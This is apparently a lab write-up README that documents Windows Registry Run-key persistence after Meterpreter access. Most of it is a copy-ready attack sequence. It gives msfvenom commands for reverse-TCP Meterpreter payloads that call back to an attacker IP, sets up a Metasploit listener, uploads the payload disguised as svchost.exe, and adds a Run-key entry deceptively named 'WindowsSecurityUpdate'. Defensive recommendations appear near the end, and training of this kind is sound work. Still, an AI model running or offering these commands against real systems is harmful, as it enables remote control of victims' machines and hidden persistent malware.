
<div align="center">

# 🛡️ Windows Registry Persistence Assessment

### `Post-Exploitation` · `Registry Run Keys` · `Persistence` · `Meterpreter`

<br>

<img src="https://img.shields.io/badge/Controlled-Lab%20Assessment-0969DA?style=for-the-badge&logoColor=white" />
<img src="https://img.shields.io/badge/Post--Exploitation-Persistence-CF222E?style=for-the-badge&logoColor=white" />
<img src="https://img.shields.io/badge/Registry-Run%20Keys-8250DF?style=for-the-badge&logoColor=white" />
<img src="https://img.shields.io/badge/Windows-Persistence-9A6700?style=for-the-badge&logo=windows&logoColor=white" />

<br><br>

> **A controlled post-exploitation lab assessment covering initial payload generation, Meterpreter access confirmation, persistence payload creation, payload placement, Registry Run-key configuration, and verification.**

</div>

---

## Overview

This practical documents a persistence workflow carried out after Meterpreter access was established on a Windows 10 laboratory target.

The activity focuses on creating a dedicated persistence payload, placing it in the Windows Temp directory, and associating it with a Windows Registry Run key.

---

## Objective

Establish and verify a Registry-based persistence mechanism after initial access by:

- Generating a dedicated persistence payload.
- Placing the payload in the Windows Temp directory.
- Creating a Windows Registry Run-key entry.
- Verifying that the Registry entry points to the stored executable.
- Preserving direct evidence for each stage of the workflow.

---

## Lab Environment

| Component | Configuration |
|---|---|
| **Attacker IP** | `192.168.88.185` |
| **Target OS** | Windows 10 |
| **Primary Access** | Meterpreter session |
| **Persistence Method** | Windows Registry Run-key |
| **Payload Location** | `C:\Windows\Temp\svchost.exe` |
| **Tools** | Metasploit Framework · msfvenom · Meterpreter · Windows Registry |
| **Environment** | Controlled cybersecurity training laboratory |

---

## Tools Used

<div align="center">

<img src="https://img.shields.io/badge/Metasploit-Framework-CF222E?style=for-the-badge&logoColor=white" />
<img src="https://img.shields.io/badge/msfvenom-Payload%20Generation-8250DF?style=for-the-badge&logoColor=white" />
<img src="https://img.shields.io/badge/Meterpreter-Session%20Access-0969DA?style=for-the-badge&logoColor=white" />
<img src="https://img.shields.io/badge/Windows-Registry-1A7F37?style=for-the-badge&logo=windows&logoColor=white" />

</div>

---

# Practical Workflow

## Step 1 — Initial Payload Generation

The initial Meterpreter payload was generated for the laboratory target and configured to connect back to the documented attacker address on TCP port `4444`.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.88.185 LPORT=4444 -f exe -o task3_payload.exe
````

The source evidence confirms that the executable was generated successfully.

---

## Step 2 — Listener Setup & Initial Access Confirmation

A Metasploit handler was configured to receive the reverse connection from the target.

```text
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.88.185
set LPORT 4444
run
```

The recorded output confirms that the reverse-TCP handler started and a Meterpreter session was subsequently opened.

---

## Step 3 — Persistence Payload Creation

A separate payload was generated for the persistence stage using TCP port `5555`, providing a distinct payload from the initial access component.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.88.185 LPORT=5555 -f exe -o persistent.exe
```

The source evidence confirms that `persistent.exe` was created successfully.

---

## Step 4 — Payload Upload to the Windows Temp Directory

The persistence executable was uploaded to the Windows Temp directory and stored as `svchost.exe`.

```text
upload /home/kali/persistent.exe C:\Windows\Temp\svchost.exe
```

The recorded Meterpreter output confirms successful transfer of the file to the target path.

---

## Step 5 — Windows Registry Entry Addition

A Registry Run-key value was created to associate the uploaded executable with the Windows user startup path.

```text
meterpreter > reg setval -k "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" -v "WindowsSecurityUpdate" -d "C:\Windows\Temp\svchost.exe"
```

The evidence shows a successful registry-value write for `WindowsSecurityUpdate`.

---

## Step 6 — Registry Entry Verification

The Windows Registry was inspected to confirm that the startup entry references the executable stored in the Temp directory.

The verification evidence shows the Run-key entry pointing to:

```text
C:\Windows\Temp\svchost.exe
```

---

# Workflow at a Glance

```text
Initial Payload Generation
          ↓
Metasploit Handler
          ↓
Meterpreter Access
          ↓
Persistence Payload Creation
          ↓
Payload Upload
          ↓
Registry Run-Key Configuration
          ↓
Registry Entry Verification
```

---

# Result & Validation

<div align="center">

<img src="https://img.shields.io/badge/INITIAL%20ACCESS-CONFIRMED-1A7F37?style=for-the-badge&logoColor=white" />
<img src="https://img.shields.io/badge/PERSISTENCE-CONFIGURED-8250DF?style=for-the-badge&logoColor=white" />
<img src="https://img.shields.io/badge/REGISTRY-VERIFIED-0969DA?style=for-the-badge&logoColor=white" />

</div>

| Validation Stage                 |                                             Result                                            |
| -------------------------------- | :-------------------------------------------------------------------------------------------: |
| **Initial payload generation**   | <img src="https://img.shields.io/badge/CONFIRMED-1A7F37?style=flat-square&logoColor=white" /> |
| **Meterpreter access**           | <img src="https://img.shields.io/badge/CONFIRMED-1A7F37?style=flat-square&logoColor=white" /> |
| **Persistence payload creation** | <img src="https://img.shields.io/badge/CONFIRMED-1A7F37?style=flat-square&logoColor=white" /> |
| **Payload upload**               | <img src="https://img.shields.io/badge/CONFIRMED-1A7F37?style=flat-square&logoColor=white" /> |
| **Registry Run-key creation**    | <img src="https://img.shields.io/badge/CONFIRMED-1A7F37?style=flat-square&logoColor=white" /> |
| **Registry entry verification**  | <img src="https://img.shields.io/badge/CONFIRMED-1A7F37?style=flat-square&logoColor=white" /> |

The submitted evidence supports the complete persistence workflow documented in this assessment.

---

# Key Findings

|                                                   Status                                                   | Finding                                                                                                   |
| :--------------------------------------------------------------------------------------------------------: | --------------------------------------------------------------------------------------------------------- |
|    <img src="https://img.shields.io/badge/ACCESS-CONFIRMED-1A7F37?style=flat-square&logoColor=white" />    | Initial Meterpreter access was established on the Windows laboratory target.                              |
|    <img src="https://img.shields.io/badge/PAYLOAD-CONFIRMED-8250DF?style=flat-square&logoColor=white" />   | A dedicated persistence payload was generated and successfully transferred to the target.                 |
|   <img src="https://img.shields.io/badge/REGISTRY-CONFIGURED-0969DA?style=flat-square&logoColor=white" />  | A Registry Run-key entry named `WindowsSecurityUpdate` was configured to reference the stored executable. |
| <img src="https://img.shields.io/badge/VERIFICATION-CONFIRMED-1A7F37?style=flat-square&logoColor=white" /> | Registry inspection confirmed that the Run-key pointed to `C:\Windows\Temp\svchost.exe`.                  |

---

# Persistence Technique

<div align="center">

<img src="https://img.shields.io/badge/PERSISTENCE-REGISTRY%20RUN%20KEYS%20%2F%20STARTUP%20FOLDER-T1547.001-CF222E?style=for-the-badge&logoColor=white" />

</div>

The documented technique corresponds to **Windows Registry Run Keys / Startup Folder persistence**.

The practical demonstrates how a program referenced through a user's Registry startup configuration can be executed automatically during the user's logon process.

---

# Security Impact

A malicious executable associated with a Windows startup location can provide an attacker with a mechanism to maintain access beyond the original compromise.

If abused outside an authorized environment, Registry-based persistence can make malicious activity harder to detect and may allow execution to continue across subsequent user logons.

---

# Defensive Recommendations

| Control                       | Defensive Purpose                                                   |
| ----------------------------- | ------------------------------------------------------------------- |
| **Registry Monitoring**       | Monitor changes to Registry Run-key locations                       |
| **Endpoint Detection**        | Detect suspicious executable creation and startup persistence       |
| **Application Control**       | Restrict execution of unauthorized binaries                         |
| **Startup Monitoring**        | Audit newly registered startup applications                         |
| **File Integrity Monitoring** | Detect unexpected executable creation or modification               |
| **Least Privilege**           | Reduce the ability of compromised accounts to establish persistence |
| **Incident Response**         | Investigate unexpected Run-key entries and associated files         |

---

# What I Learned

This practical demonstrated how persistence can be established after initial access by combining:

```text
Payload Generation
        ↓
Initial Access
        ↓
File Placement
        ↓
Registry Configuration
        ↓
Persistence Verification
```

It also reinforced the importance of validating each stage with direct evidence rather than relying only on an assumed outcome.

---

# Environment Disclaimer

> **Controlled Cybersecurity Laboratory Exercise**

This report is based on the submitted practical material and is presented as an educational exercise in a controlled laboratory environment.

It does not claim that the documented activity was performed against an unauthorized production system.

---

# Evidence

The supporting screenshots are embedded throughout the PDF and follow the same step-by-step sequence documented above.

### [Windows Registry Persistence Assessment — Full Report](./windows-registry-persistence-assessment.pdf)

---

<div align="center">

<img src="https://img.shields.io/badge/Windows-Persistence-CF222E?style=for-the-badge&logo=windows&logoColor=white" />
<img src="https://img.shields.io/badge/Registry-Security-8250DF?style=for-the-badge&logoColor=white" />
<img src="https://img.shields.io/badge/Post--Exploitation-Lab-0969DA?style=for-the-badge&logoColor=white" />

<br><br>

### Windows Security · Persistence Analysis · Practical Testing

</div>

---

> **Repository Note:** This write-up is intended for authorized cybersecurity training, documentation, and controlled laboratory use only.

